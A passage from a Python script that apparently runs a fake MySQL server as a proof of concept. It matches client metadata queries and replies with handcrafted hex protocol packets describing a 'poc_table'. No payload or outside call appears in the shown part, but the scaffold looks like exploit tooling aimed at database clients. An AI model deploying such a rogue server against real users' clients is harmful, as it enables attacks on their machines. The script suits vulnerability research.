d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0b\x69\x73\x5f\x6e\x75\x6c\x6c\x61\x62\x6c\x65\x0b\x49\x53\x5f\x4e\x55\x4c\x4c\x41\x42\x4c\x45\x0c\xe0\x00\x0c\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x52\x00\x00\x06\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0e\x63\x6f\x6c\x75\x6d\x6e\x5f\x64\x65\x66\x61\x75\x6c\x74\x0e\x43\x4f\x4c\x55\x4d\x4e\x5f\x44\x45\x46\x41\x55\x4c\x54\x0c\xe0\x00\xf4\xff\x0b\x00\xfc\x10\x00\x00\x00\x00\x56\x00\x00\x07\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x10\x6f\x72\x64\x69\x6e\x61\x6c\x5f\x70\x6f\x73\x69\x74\x69\x6f\x6e\x10\x4f\x52\x44\x49\x4e\x41\x4c\x5f\x50\x4f\x53\x49\x54\x49\x4f\x4e\x0c\x3f\x00\x15\x00\x00\x00\x08\x21\x00\x00\x00\x00\x52\x00\x00\x08\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0e\x63\x6f\x6c\x75\x6d\x6e\x5f\x63\x6f\x6d\x6d\x65\x6e\x74\x0e\x43\x4f\x4c\x55\x4d\x4e\x5f\x43\x4f\x4d\x4d\x45\x4e\x54\x0c\xe0\x00\x00\x10\x00\x00\xfd\x01\x00\x00\x00\x00\x40\x00\x00\x09\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x05\x65\x78\x74\x72\x61\x05\x45\x58\x54\x52\x41\x0c\xe0\x00\x78\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x0a\xfe\x00\x00\x23\x00\x34\x00\x00\x0b\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x02\x69\x64\x10\x69\x6e\x74\x28\x31\x30\x29\x20\x75\x6e\x73\x69\x67\x6e\x65\x64\x02\x4e\x4f\xfb\x01\x31\x00\x0e\x61\x75\x74\x6f\x5f\x69\x6e\x63\x72\x65\x6d\x65\x6e\x74\x38\x00\x00\x0c\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x0a\x63\x72\x65\x61\x74\x65\x64\x5f\x61\x74\x09\x74\x69\x6d\x65\x73\x74\x61\x6d\x70\x02\x4e\x4f\x11\x43\x55\x52\x52\x45\x4e\x54\x5f\x54\x49\x4d\x45\x53\x54\x41\x4d\x50\x01\x32\x00\x00\x05\x00\x00\x0d\xfe\x00\x00\x23\x00")
                    else:
                        sendBuff(clientSocket,b"\x01\x00\x00\x01\x08\x4a\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0a\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4c\x00\x00\x03\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0b\x63\x6f\x6c\x75\x6d\x6e\x5f\x6e\x61\x6d\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4a\x00\x00\x04\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x09\x64\x61\x74\x61\x5f\x74\x79\x70\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x54\x59\x50\x45\x0c\xe0\x00\xf4\xff\x0b\x00\xfc\x11\x00\x00\x00\x00\x4c\x00\x00\x05\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0b\x69\x73\x5f\x6e\x75\x6c\x6c\x61\x62\x6c\x65\x0b\x49\x53\x5f\x4e\x55\x4c\x4c\x41\x42\x4c\x45\x0c\xe0\x00\x0c\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x52\x00\x00\x06\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0e\x63\x6f\x6c\x75\x6d\x6e\x5f\x64\x65\x66\x61\x75\x6c\x74\x0e\x43\x4f\x4c\x55\x4d\x4e\x5f\x44\x45\x46\x41\x55\x4c\x54\x0c\xe0\x00\xf4\xff\x0b\x00\xfc\x10\x00\x00\x00\x00\x56\x00\x00\x07\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x10\x6f\x72\x64\x69\x6e\x61\x6c\x5f\x70\x6f\x73\x69\x74\x69\x6f\x6e\x10\x4f\x52\x44\x49\x4e\x41\x4c\x5f\x50\x4f\x53\x49\x54\x49\x4f\x4e\x0c\x3f\x00\x15\x00\x00\x00\x08\x21\x00\x00\x00\x00\x52\x00\x00\x08\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0e\x63\x6f\x6c\x75\x6d\x6e\x5f\x63\x6f\x6d\x6d\x65\x6e\x74\x0e\x43\x4f\x4c\x55\x4d\x4e\x5f\x43\x4f\x4d\x4d\x45\x4e\x54\x0c\xe0\x00\x00\x10\x00\x00\xfd\x01\x00\x00\x00\x00\x40\x00\x00\x09\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x05\x65\x78\x74\x72\x61\x05\x45\x58\x54\x52\x41\x0c\xe0\x00\x78\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x0a\xfe\x00\x00\x22\x00\x34\x00\x00\x0b\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x02\x69\x64\x10\x69\x6e\x74\x28\x31\x30\x29\x20\x75\x6e\x73\x69\x67\x6e\x65\x64\x02\x4e\x4f\xfb\x01\x31\x00\x0e\x61\x75\x74\x6f\x5f\x69\x6e\x63\x72\x65\x6d\x65\x6e\x74\x38\x00\x00\x0c\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x0a\x63\x72\x65\x61\x74\x65\x64\x5f\x61\x74\x09\x74\x69\x6d\x65\x73\x74\x61\x6d\x70\x02\x4e\x4f\x11\x43\x55\x52\x52\x45\x4e\x54\x5f\x54\x49\x4d\x45\x53\x54\x41\x4d\x50\x01\x32\x00\x00\x05\x00\x00\x0d\xfe\x00\x00\x22\x00")
                else:
                    print("[+] SELECT table_name AS 'table_name' ... ORDER BY ordinal_position")
                    if(IS_DB_SELECTED):
                        sendBuff(clientSocket,TABLE_INIT_2)
                    else:
                        sendBuff(clientSocket,INIT_3)
            elif(b"r.specific_name as specific_name" in data and b"order by r.specific_name" in data):
                print("[+] SELECT r.specific_name as specific_name ... order by r.specific_name")
                sendBuff(clientSocket,INIT_4)
            elif(b"r.routine_schema as routine_schema" in data and b"order by r.routine_schema" in data):
                print("[+] SELECT r.routine_schema as routine_schema ... order by r.routine_schema")
                sendBuff(clientSocket,INIT_5)
                IS_DB_SELECTED = True
                clientSocket.close()
                break
            elif(b"SELECT TABLE_TYPE as tt" in data and b"TABLE_NAME ="):
                print("[+] SELECT TABLE_TYPE as tt ... where table_schema = database() and TABLE_NAME = 'poc_table'")
                sendBuff(clientSocket,TABLE_INIT_3)
                clientSocket.close()
                break
            elif(b"show table status like" in data):
                print("[+] show table status like")
                sendBuff(clientSocket,b"\x01\x00\x00\x01\x12\x42\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x04\x4e\x61\x6d\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x40\x00\x00\x03\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x06\x45\x6e\x67\x69\x6e\x65\x06\x45\x4e\x47\x49\x4e\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x00\x00\x00\x00\x00\x42\x00\x00\x04\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x07\x56\x65\x72\x73\x69\x6f\x6e\x07\x56\x45\x52\x53\x49\x4f\x4e\x0c\x3f\x00\x15\x00\x00\x00\x08\x20\x00\x00\x00\x00\x48\x00\x00\x05\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0a\x52\x6f\x77\x5f\x66\x6f\x72\x6d\x61\x74\x0a\x52\x4f\x57\x5f\x46\x4f\x52\x4d\x41\x54\x0c\xe0\x00\x28\x00\x00\x00\xfd\x00\x00\x00\x00\x00\x42\x00\x00\x06\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x04\x52\x6f\x77\x73\x0a\x54\x41\x42\x4c\x45\x5f\x52\x4f\x57\x53\x0c\x3f\x00\x15\x00\x00\x00\x08\x20\x00\x00\x00\x00\x50\x00\x00\x07\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0e\x41\x76\x67\x5f\x72\x6f\x77\x5f\x6c\x65\x6e\x67\x74\x68\x0e\x41\x56\x47\x5f\x52\x4f\x57\x5f\x4c\x45\x4e\x47\x54\x48\x0c\x3f\x00\x15\x00\x00\x00\x08\x20\x00\x00\x00\x00\x4a\x00\x00\x08\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0b\x44\x61\x74\x61\x5f\x6c\x65\x6e\x67\x74\x68\x0b\x44\x41\x54\x41\x5f\x4c\x45\x4e\x47\x54\x48\x0c\x3f\x00\x15\x00\x00\x00\x08\x20\x00\x00\x00\x00\x52\x00\x00\x09\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0f\x4d\x61\x78\x5f\x64\x61\x74\x61\x5f\x6c\x65\x6e\x67\x74\x68\x0f\x4d\x41\x58\x5f\x44\x41\x54\x41\x5f\x4c\x45\x4e\x47\x54\x48\x0c\x3f\x00\x15\x00\x00\x00\x08\x20\x00\x00\x00\x00\x4c\x00\x00\x0a\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0c\x49\x6e\x64\x65\x78\x5f\x6c\x65\x6e\x67\x74\x68\x0c\x49\x4e\x44\x45\x58\x5f\x4c\x45\x4e\x47\x54\x48\x0c\x3f\x00\x15\x00\x00\x00\x08\x20\x00\x00\x00\x00\x46\x00\x00\x0b\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x09\x44\x61\x74\x61\x5f\x66\x72\x65\x65\x09\x44\x41\x54\x41\x5f\x46\x52\x45\x45\x0c\x3f\x00\x15\x00\x00\x00\x08\x20\x00\x00\x00\x00\x50\x00\x00\x0c\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0e\x41\x75\x74\x6f\x5f\x69\x6e\x63\x72\x65\x6d\x65\x6e\x74\x0e\x41\x55\x54\x4f\x5f\x49\x4e\x43\x52\x45\x4d\x45\x4e\x54\x0c\x3f\x00\x15\x00\x00\x00\x08\x20\x00\x00\x00\x00\x4a\x00\x00\x0d\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0b\x43\x72\x65\x61\x74\x65\x5f\x74\x69\x6d\x65\x0b\x43\x52\x45\x41\x54\x45\x5f\x54\x49\x4d\x45\x0c\x3f\x00\x13\x00\x00\x00\x0c\x80\x00\x00\x00\x00\x4a\x00\x00\x0e\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0b\x55\x70\x64\x61\x74\x65\x5f\x74\x69\x6d\x65\x0b\x55\x50\x44\x41\x54\x45\x5f\x54\x49\x4d\x45\x0c\x3f\x00\x13\x00\x00\x00\x0c\x80\x00\x00\x00\x00\x48\x00\x00\x0f\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0a\x43\x68\x65\x63\x6b\x5f\x74\x69\x6d\x65\x0a\x43\x48\x45\x43\x4b\x5f\x54\x49\x4d\x45\x0c\x3f\x00\x13\x00\x00\x00\x0c\x80\x00\x00\x00\x00\x4c\x00\x00\x10\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x09\x43\x6f\x6c\x6c\x61\x74\x69\x6f\x6e\x0f\x54\x41\x42\x4c\x45\x5f\x43\x4f\x4c\x4c\x41\x54\x49\x4f\x4e\x0c\xe0\x00\x80\x00\x00\x00\xfd\x00\x00\x00\x00\x00\x44\x00\x00\x11\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x08\x43\x68\x65\x63\x6b\x73\x75\x6d\x08\x43\x48\x45\x43\x4b\x53\x55\x4d\x0c\x3f\x00\x15\x00\x00\x00\x08\x20\x00\x00\x00\x00\x50\x00\x00\x12\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x0e\x43\x72\x65\x61\x74\x65\x5f\x6f\x70\x74\x69\x6f\x6e\x73\x0e\x43\x52\x45\x41\x54\x45\x5f\x4f\x50\x54\x49\x4f\x4e\x53\x0c\xe0\x00\xfc\x03\x00\x00\xfd\x00\x00\x00\x00\x00\x48\x00\x00\x13\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x07\x43\x6f\x6d\x6d\x65\x6e\x74\x0d\x54\x41\x42\x4c\x45\x5f\x43\x4f\x4d\x4d\x45\x4e\x54\x0c\xe0\x00\x00\x20\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x14\xfe\x00\x00\x22\x00\x57\x00\x00\x15\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x06\x49\x6e\x6e\x6f\x44\x42\x02\x31\x30\x07\x44\x79\x6e\x61\x6d\x69\x63\x01\x30\x01\x30\x05\x31\x36\x33\x38\x34\x01\x30\x01\x30\x01\x30\x01\x31\x13\x32\x30\x32\x32\x2d\x31\x30\x2d\x30\x37\x20\x30\x33\x3a\x33\x39\x3a\x34\x30\xfb\xfb\x0f\x75\x74\x66\x38\x5f\x67\x65\x6e\x65\x72\x61\x6c\x5f\x63\x69\xfb\x00\x00\x05\x00\x00\x16\xfe\x00\x00\x22\x00")
            elif(b"SHOW KEYS FROM" in data):
                print("[+] SHOW KEYS FROM  `poc_table` WHERE Key_name = 'PRIMARY'")
                sendBuff(clientSocket,b"\x01\x00\x00\x01\x0d\x4b\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x05\x54\x61\x62\x6c\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x50\x00\x00\x03\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x4e\x6f\x6e\x5f\x75\x6e\x69\x71\x75\x65\x0a\x4e\x4f\x4e\x5f\x55\x4e\x49\x51\x55\x45\x0c\x3f\x00\x01\x00\x00\x00\x08\x01\x00\x00\x00\x00\x4e\x00\x00\x04\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x08\x4b\x65\x79\x5f\x6e\x61\x6d\x65\x0a\x49\x4e\x44\x45\x58\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x54\x00\x00\x05\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0c\x53\x65\x71\x5f\x69\x6e\x5f\x69\x6e\x64\x65\x78\x0c\x53\x45\x51\x5f\x49\x4e\x5f\x49\x4e\x44\x45\x58\x0c\x3f\x00\x02\x00\x00\x00\x08\x01\x00\x00\x00\x00\x52\x00\x00\x06\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0b\x43\x6f\x6c\x75\x6d\x6e\x5f\x6e\x61\x6d\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4e\x00\x00\x07\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x09\x43\x6f\x6c\x6c\x61\x74\x69\x6f\x6e\x09\x43\x4f\x4c\x4c\x41\x54\x49\x4f\x4e\x0c\xe0\x00\x04\x00\x00\x00\xfd\x00\x00\x00\x00\x00\x52\x00\x00\x08\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0b\x43\x61\x72\x64\x69\x6e\x61\x6c\x69\x74\x79\x0b\x43\x41\x52\x44\x49\x4e\x41\x4c\x49\x54\x59\x0c\x3f\x00\x15\x00\x00\x00\x08\x00\x00\x00\x00\x00\x4c\x00\x00\x09\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x08\x53\x75\x62\x5f\x70\x61\x72\x74\x08\x53\x55\x42\x5f\x50\x41\x52\x54\x0c\x3f\x00\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x48\x00\x00\x0a\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x06\x50\x61\x63\x6b\x65\x64\x06\x50\x41\x43\x4b\x45\x44\x0c\xe0\x00\x28\x00\x00\x00\xfd\x00\x00\x00\x00\x00\x48\x00\x00\x0b\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x04\x4e\x75\x6c\x6c\x08\x4e\x55\x4c\x4c\x41\x42\x4c\x45\x0c\xe0\x00\x0c\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x50\x00\x00\x0c\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x49\x6e\x64\x65\x78\x5f\x74\x79\x70\x65\x0a\x49\x4e\x44\x45\x58\x5f\x54\x59\x50\x45\x0c\xe0\x00\x40\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x4a\x00\x00\x0d\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x07\x43\x6f\x6d\x6d\x65\x6e\x74\x07\x43\x4f\x4d\x4d\x45\x4e\x54\x0c\xe0\x00\x40\x00\x00\x00\xfd\x00\x00\x00\x00\x00\x56\x00\x00\x0e\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0a\x53\x54\x41\x54\x49\x53\x54\x49\x43\x53\x0d\x49\x6e\x64\x65\x78\x5f\x63\x6f\x6d\x6d\x65\x6e\x74\x0d\x49\x4e\x44\x45\x58\x5f\x43\x4f\x4d\x4d\x45\x4e\x54\x0c\xe0\x00\x00\x10\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x0f\xfe\x00\x00\x22\x00\x28\x00\x00\x10\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x01\x30\x07\x50\x52\x49\x4d\x41\x52\x59\x01\x31\x02\x69\x64\x01\x41\x01\x30\xfb\xfb\x00\x05\x42\x54\x52\x45\x45\x00\x00\x05\x00\x00\x11\xfe\x00\x00\x22\x00")
            elif(b"cu.constraint_name as 'constraint_name'" in data):
                print("[+] SELECT cu.constraint_name as 'constraint_name' ... AND cu.table_name = 'poc_table'")
                sendBuff(clientSocket,b"\x01\x00\x00\x01\x08\x58\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x02\x63\x75\x10\x4b\x45\x59\x5f\x43\x4f\x4c\x55\x4d\x4e\x5f\x55\x53\x41\x47\x45\x0f\x63\x6f\x6e\x73\x74\x72\x61\x69\x6e\x74\x5f\x6e\x61\x6d\x65\x0f\x43\x4f\x4e\x53\x54\x52\x41\x49\x4e\x54\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x50\x00\x00\x03\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x02\x63\x75\x10\x4b\x45\x59\x5f\x43\x4f\x4c\x55\x4d\x4e\x5f\x55\x53\x41\x47\x45\x0b\x63\x6f\x6c\x75\x6d\x6e\x5f\x6e\x61\x6d\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x64\x00\x00\x04\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x02\x63\x75\x10\x4b\x45\x59\x5f\x43\x4f\x4c\x55\x4d\x4e\x5f\x55\x53\x41\x47\x45\x15\x72\x65\x66\x65\x72\x65\x6e\x63\x65\x64\x5f\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x15\x52\x45\x46\x45\x52\x45\x4e\x43\x45\x44\x5f\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x00\x00\x00\x00\x00\x1e\x00\x00\x05\x03\x64\x65\x66\x00\x00\x00\x08\x6b\x65\x79\x5f\x74\x79\x70\x65\x00\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x1f\x00\x00\x5f\x00\x00\x06\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x02\x63\x75\x10\x4b\x45\x59\x5f\x43\x4f\x4c\x55\x4d\x4e\x5f\x55\x53\x41\x47\x45\x10\x72\x65\x66\x65\x72\x65\x6e\x63\x65\x64\x5f\x74\x61\x62\x6c\x65\x15\x52\x45\x46\x45\x52\x45\x4e\x43\x45\x44\x5f\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\x